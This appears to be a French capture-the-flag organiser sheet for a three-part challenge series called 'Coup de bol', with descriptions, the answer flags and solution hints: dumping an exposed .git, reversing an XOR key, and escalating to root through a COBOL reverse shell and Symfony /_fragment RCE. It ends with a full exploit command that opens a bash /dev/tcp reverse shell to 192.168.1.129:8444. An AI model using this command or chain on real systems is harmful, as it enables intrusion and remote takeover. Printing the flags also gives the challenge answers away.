# Coup de bol 1/3 - Gitty Mistake

| Catégorie  | Web      |
|------------|----------|
| Difficulté | Facile 😊 |
| État       | Validé ✅ |

## Description

Un ami se vante de son nouveau site, prétendant qu'il est infaillible parce qu'il utilise une technologie très ancienne et et qui a fait ses preuves. Peux-tu prouver qu'il a tort en accédant à sa page secrète ?

Note : Outils d'énumération de ressources autorisés.

- Auteur : Romain

## Indices
1. Versioning

## Flag
||`CYBN{D3v3l0pm3n7_r3s0urc3s_c4n_b3_us3fu1}`||

## Pistes
git-dumper pour récup le .git, analyse des sources pour trouver /SuperTopSecretAdminPage et trouver la subtilité dans le controller admin.cbl qui montre qu'il faut faire la req avec -H "Host: mysecretadministrationdomain.arpa"

--------------------------------------------

# Coup de bol 2/3 - The old days...

| Catégorie  | Reverse   |
|------------|-----------|
| Difficulté | Moyen 🙂 |
| État       | A tester 🎯 |

## Description

Alors comme ça, tu as réussi à récupérer toutes les sources de son application, ainsi que l'exécutable qui tourne sur la machine ? Bien, peut-être que ce dernier contient la clé pour aller plus loin.

Note : Entourez ce que vous pensez être le flag avec ``CYBN{<votre idée>}``

- Auteur : Romain

## Flag
||`CYBN{Ju57_4_s1mpl3_X0R}`||

## Pistes
Reverse le the.cow qu'a été commit, pour retrouver la clé qui sert à l'upload

--------------------------------------------

# Coup de bol 3/3 - Une symphonie de langages

| Catégorie  | Web      |
|------------|----------|
| Difficulté | Difficile 😠 |
| État       | A tester 🎯 |

## Description

Maintenant que t'as sa fameuse clé secrète, montre lui une bonne fois pour toutes qu'il n'aurait pas du te challenger, deviens root sur sa machine !

- Auteur : Romain

## Flag
||`CYBN{Fully_pwn3d_m4ch1n3}`||

## Pistes
Utiliser la clé de l'étape précédente pour post un revshell en cobol qui sera run sur le container en tant que www-data, scan interne pour trouver la présence d'un symfony sur 127.0.0.1:8000 (trouvable aussi via analyse des sources), récupérer son APP_SECRET, rce via /_fragment du symfony pour latéraliser sur le compte qui run l'app (root).

```sh
python symfony-secret-fragments-v2.py 'http://127.0.0.1:8000/_fragment' --secret 'a4b0d6ee9ea8678112a3dbaed3143b16' --algo sha256 --method 1 --function popen --arguments "command:bash -c 'sh -i >& /dev/tcp/192.168.1.129/8444 0>&1'" 'mode:r' --internal-url 'http://127.0.0.1:8000/_fragment'```
